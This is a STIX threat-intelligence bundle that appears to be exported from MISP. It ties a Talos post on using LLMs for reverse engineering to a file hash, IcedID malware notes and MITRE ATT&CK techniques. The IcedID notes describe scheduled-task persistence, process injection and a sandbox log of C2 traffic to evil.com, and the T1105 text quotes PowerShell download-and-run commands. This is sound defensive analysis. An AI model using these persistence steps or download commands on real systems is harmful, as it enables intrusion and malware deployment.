{"type": "bundle", "spec_version": "2.0", "id": "bundle--ed8e9b1d-fe64-44c3-8b21-4a795ba7968b", "objects": [{"type": "identity", "id": "identity--5df15c12-89fc-45a7-9620-0044ac110004", "created": "2025-07-31T15:54:21.000Z", "modified": "2025-07-31T15:54:21.000Z", "name": "Talos", "identity_class": "organization"}, {"type": "report", "id": "report--cc2d98d4-7137-46fc-94c8-889617bc1d1f", "created_by_ref": "identity--5df15c12-89fc-45a7-9620-0044ac110004", "created": "2025-07-31T15:54:21.000Z", "modified": "2025-07-31T15:54:21.000Z", "name": "On the radar: Using LLMs as a reverse engineering sidekick", "published": "2025-07-31T15:54:47Z", "object_refs": ["observed-data--d2737dd0-7c4c-423c-b345-863b635b823b", "indicator--adfbed1d-a8e6-4dae-a5f1-43e280a2fc4d", "malware--26f5afaf-0bd7-4741-91ab-917bdd837330", "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add", "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6"], "labels": ["Threat-Report", "misp:tool=\"MISP-STIX-Converter\"", "Talos_Intel_Blog"], "object_marking_refs": ["marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"]}, {"type": "observed-data", "id": "observed-data--d2737dd0-7c4c-423c-b345-863b635b823b", "created_by_ref": "identity--5df15c12-89fc-45a7-9620-0044ac110004", "created": "2025-07-31T15:48:09.000Z", "modified": "2025-07-31T15:48:09.000Z", "first_observed": "2025-07-31T15:48:09Z", "last_observed": "2025-07-31T15:48:09Z", "number_observed": 1, "objects": {"0": {"type": "url", "value": "https://blog.talosintelligence.com/using-llm-as-a-reverse-engineering-sidekick/"}}, "labels": ["misp:type=\"url\"", "misp:category=\"External analysis\""]}, {"type": "indicator", "id": "indicator--adfbed1d-a8e6-4dae-a5f1-43e280a2fc4d", "created_by_ref": "identity--5df15c12-89fc-45a7-9620-0044ac110004", "created": "2025-07-31T15:49:25.000Z", "modified": "2025-07-31T15:49:25.000Z", "pattern": "[file:hashes.SHA256 = '7412945177641e9b9b27e601eeda32fda02eae10d0247035039b9174dcc01d12']", "valid_from": "2025-07-31T15:49:25Z", "kill_chain_phases": [{"kill_chain_name": "misp-category", "phase_name": "Payload delivery"}], "labels": ["misp:type=\"sha256\"", "misp:category=\"Payload delivery\"", "misp:to_ids=\"True\""]}, {"type": "malware", "id": "malware--26f5afaf-0bd7-4741-91ab-917bdd837330", "created": "2025-07-31T15:54:21.000Z", "modified": "2025-07-31T15:54:21.000Z", "name": "IcedID", "description": "Malware galaxy based on Malpedia archive. | Analysis Observations:\r\n\r\n* It sets up persistence by creating a Scheduled Task with the following characteristics:\r\n  * Name: Update\r\n  * Trigger: At Log on\r\n  * Action: %LocalAppData%\\$Example\\\\waroupada.exe /i\r\n  * Conditions: Stop if the computer ceases to be idle.\r\n* The sub-directory within %LocalAppdata%, Appears to be randomly picked from the list of directories within %ProgramFiles%. This needs more verification.\r\n* The filename remained static during analysis.\r\n* The original malware exe (ex. waroupada.exe) will spawn an instance of svchost.exe as a sub-process and then inject/execute its malicious code within it\r\n* If \u201c/i\u201d is not passed as an argument, it sets up persistence and waits for reboot.\r\n* If \u201c/I\u201d is passed as an argument (as is the case when the scheduled task is triggered at login), it skips persistence setup and actually executes; resulting in C2 communication.\r\n* Employs an interesting method for sleeping by calling the Sleep function of kernel32.dll from the shell, like so:\r\n      rundll32.exe kernel32,Sleep -s\r\n* Setup a local listener to proxy traffic on 127.0.0.1:50000\r\n\r\n**[Example Log from C2 Network Communication]**\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] connect\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: POST /forum/posting.php?a=0&b=4FC0302F4C59D8CDB8&d=0&e=63&f=0&g=0&h=0&r=0&i=266390&j=11 HTTP/1.1\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Connection: close\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Content-Type: application/x-www-form-urlencoded\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Content-Length: 196\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Host: evil.com\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: <(POSTDATA)>\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: POST data stored to: /var/lib/inetsim/http/postdata/a90b931cb23df85aa6e3f0039958b031c3b053a2\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: **Request URL: hxxps://evil.com/forum/posting.php?a=0&b=4FC0302F4C59D8CDB8&d=0&e=63&f=0&g=0&h=0&r=0&i=266390&j=11**\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: Sending fake file configured for extension 'php'.\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: HTTP/1.1 200 OK\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Content-Type: text/html\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Server: INetSim HTTPs Server\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Date: Mon, 19 Mar 2018 16:45:55 GMT\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Connection: Close\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Content-Length: 258\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: Sending file: /var/lib/inetsim/http/fakefiles/sample.html\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] stat: 1 **method=POST url=hxxps://evil.com/forum/posting.php?a=0&b=4FC0302F4C59D8CDB8&d=0&e=63&f=0&g=0&h=0&r=0&i=266390&j=11** sent=/var/lib/inetsim/http/fakefiles/sample.html postdata=/var/lib/inetsim/http/postdata/a90b931cb23df85aa6e3f0039958b031c3b053a2", "kill_chain_phases": [{"kill_chain_name": "misp-category", "phase_name": "malpedia"}], "labels": ["misp:galaxy-name=\"Malpedia\"", "misp:galaxy-type=\"malpedia\"", "misp-galaxy:malpedia=\"IcedID\""]}, {"type": "attack-pattern", "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add", "created": "2025-07-31T15:54:21.000Z", "modified": "2025-07-31T15:54:21.000Z", "name": "Ingress Tool Transfer - T1105", "description": "ATT&CK Tactic | Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)", "kill_chain_phases": [{"kill_chain_name": "misp-category", "phase_name": "mitre-attack-pattern"}], "labels": ["misp:galaxy-name=\"Attack Pattern\"", "misp:galaxy-type=\"mitre-attack-pattern\"", "misp-galaxy:mitre-attack-pattern=\"Ingress Tool Transfer - T1105\""], "external_references": [{"source_name": "mitre-attack", "external_id": "T1105"}]}, {"type": "attack-pattern", "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6", "created": "2025-07-31T15:54:21.000Z", "modified": "2025-07-31T15:54:21.000Z", "name": "Application Layer Protocol - T1071", "description": "ATT&CK Tactic | Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ", "kill_chain_phases": [{"kill_chain_name": "misp-category", "phase_name": "mitre-attack-pattern"}], "labels": ["misp:galaxy-name=\"Attack Pattern\"", "misp:galaxy-type=\"mitre-attack-pattern\"", "misp-galaxy:mitre-attack-pattern=\"Application Layer Protocol - T1071\""], "external_references": [{"source_name": "mitre-attack", "external_id": "T1071"}]}, {"type": "marking-definition", "id": "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9", "created": "2017-01-20T00:00:00.000Z", "definition_type": "tlp", "definition": {"tlp": "white"}}]}
